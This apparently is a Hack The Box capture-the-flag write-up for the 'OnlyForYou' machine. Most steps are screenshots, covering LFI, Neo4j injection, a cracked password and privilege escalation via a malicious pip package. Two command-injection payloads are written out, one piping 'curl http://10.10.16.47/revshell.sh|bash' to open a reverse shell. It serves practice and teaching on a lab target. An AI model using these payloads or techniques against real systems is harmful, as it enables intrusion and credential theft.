---
title: "OnlyForYou Machine Writeup"
classes: wide
header:
...
<img src="/assets/images/hackthebox/OnlyForYou-Writeup/OnlyForYou.png" alt="OnlyForYou" style="zoom:50%;" />
...
![nmap](/assets/images/hackthebox/OnlyForYou-Writeup/nmap.png)

We can see that port 80 is open, so let's check it.

![only4you](/assets/images/hackthebox/OnlyForYou-Writeup/only4you.png)

We can't find anything interesting, so let's do subdomain enumeration.

![wfuzz](/assets/images/hackthebox/OnlyForYou-Writeup/wfuzz.png)

We can see `beta.only4you.htb` subdomain, so let's check it.

![](/assets/images/hackthebox/OnlyForYou-Writeup/beta-page.png)

## LFI

We can see that we have source code, so let's download and unzip it.

![beta-source-code](/assets/images/hackthebox/OnlyForYou-Writeup/beta-source-code.png)

If we check `app.py`, the `/download` route looks interesting.

![bet-app](/assets/images/hackthebox/OnlyForYou-Writeup/bet-app.png)
...
![beta-list](/assets/images/hackthebox/OnlyForYou-Writeup/beta-list.png)

Let's intercept the request to Burp and play with `image` parameter.

![beta-download](/assets/images/hackthebox/OnlyForYou-Writeup/beta-download.png)

We can use `/etc/passwd` to bypass `..` filter and it shows the following result:

![passwd](/assets/images/hackthebox/OnlyForYou-Writeup/passwd.png)

As we know the running server is `nginx`, we can try to read `nginx.conf`.

![nginx-conf](/assets/images/hackthebox/OnlyForYou-Writeup/nginx-conf.png)

We can see that we have `/etc/nginx/sites-enabled/` let's read the `/default`.

![nginx-default](/assets/images/hackthebox/OnlyForYou-Writeup/nginx-default.png)

We have `app.py` in beta folder, so let's read `app.py` using `/var/www/only4you/app.py`.

![only4you-app](/assets/images/hackthebox/OnlyForYou-Writeup/only4you-app.png)
...
![only4you-form](/assets/images/hackthebox/OnlyForYou-Writeup/only4you-form.png)
...
![only4you-contact](/assets/images/hackthebox/OnlyForYou-Writeup/only4you-contact.png)

Now let's try to test the `email` parameter with `test@test.com|ping 10.10.x.x`.

![command-injection-test-1](/assets/images/hackthebox/OnlyForYou-Writeup/command-injection-test-1.png)

It responds to our listener which means that the code is vulnerable to command injection.

![command-injection-test-2](/assets/images/hackthebox/OnlyForYou-Writeup/command-injection-test-2.png)
...
![revshel-payload](/assets/images/hackthebox/OnlyForYou-Writeup/revshel-payload.png)

The we can call it using `test@test.com|curl http://10.10.16.47/revshell.sh|bash`.

![revshell-payload](/assets/images/hackthebox/OnlyForYou-Writeup/revshell-payload.png)

Now we get a reverse shell as seen below.

![revshell](/assets/images/hackthebox/OnlyForYou-Writeup/revshell.png)

## Shell as john

When we check the machine manually, we can find the following open ports.

![netstat](/assets/images/hackthebox/OnlyForYou-Writeup/netstat.png)
...
![chisel-server](/assets/images/hackthebox/OnlyForYou-Writeup/chisel-server.png)

Forwarding the required ports on the server machine:

![chisel-client](/assets/images/hackthebox/OnlyForYou-Writeup/chisel-client.png)
...
![gogs-3000](/assets/images/hackthebox/OnlyForYou-Writeup/gogs-3000.png)

Checking port `8001`, we can see a login page but we don't have any login credentials.

![port-8001-login](/assets/images/hackthebox/OnlyForYou-Writeup/port-8001-login.png)

If we try `admin:admin` we will be navigated to the admin dashboard.

![port-8001](/assets/images/hackthebox/OnlyForYou-Writeup/port-8001.png)
...
![search-func](/assets/images/hackthebox/OnlyForYou-Writeup/search-func.png)
...
![neo4j-version-burp](/assets/images/hackthebox/OnlyForYou-Writeup/neo4j-version-burp.png)

We can setup a simple HTTP server using python to receive the payload response.

![neo4j-version](/assets/images/hackthebox/OnlyForYou-Writeup/neo4j-version.png)
...
![neo4j-tables-burp](/assets/images/hackthebox/OnlyForYou-Writeup/neo4j-tables-burp.png)

![neo4j-tables](/assets/images/hackthebox/OnlyForYou-Writeup/neo4j-tables.png)
...
![neo4j-creds-burp](/assets/images/hackthebox/OnlyForYou-Writeup/neo4j-creds-burp.png)

![neo4j-creds](/assets/images/hackthebox/OnlyForYou-Writeup/neo4j-creds.png)

We can see hashed password for the user `john`. We can crack it using [crackstation](https://crackstation.net/).

![crackstation](/assets/images/hackthebox/OnlyForYou-Writeup/crackstation.png)

Now we can login using SSH as `john:ThisIs4You` and read `user.txt`.

![user-flag](/assets/images/hackthebox/OnlyForYou-Writeup/user-flag.png)

## Shell as root

Let's check the sudo permissions allowed to our user `john`.

![sudo-priv](/assets/images/hackthebox/OnlyForYou-Writeup/sudo-priv.png)
...
![gogs-dashboard](/assets/images/hackthebox/OnlyForYou-Writeup/gogs-dashboard.png)
...
![root-exploit](/assets/images/hackthebox/OnlyForYou-Writeup/root-exploit.png)

Then, we need to run `python3 -m build` to generate `.tar.gz` file.

![python3-build](/assets/images/hackthebox/OnlyForYou-Writeup/python3-build.png)

Now we should create a new repository on `Gogs`.

![root-repo](/assets/images/hackthebox/OnlyForYou-Writeup/root-repo.png)

![root-repo-commands](/assets/images/hackthebox/OnlyForYou-Writeup/root-repo-commands.png)

Finally, we can push our `.tar.gz` file to the newly created repository.

![root-priv-2](/assets/images/hackthebox/OnlyForYou-Writeup/root-priv-2.png)

Now we have our file in `root` repository we just created.

![root-repo-2](/assets/images/hackthebox/OnlyForYou-Writeup/root-repo-2.png)

Let's download the tar file using pip3 which will in turn unzip and run the `setup.py` file.

![root-priv-1](/assets/images/hackthebox/OnlyForYou-Writeup/root-priv-1.png)

Now Let's run `/bin/bash` and use the `-p` option to run it in privileged mode to be able to read `root.txt`.

![root-flag](/assets/images/hackthebox/OnlyForYou-Writeup/root-flag.png)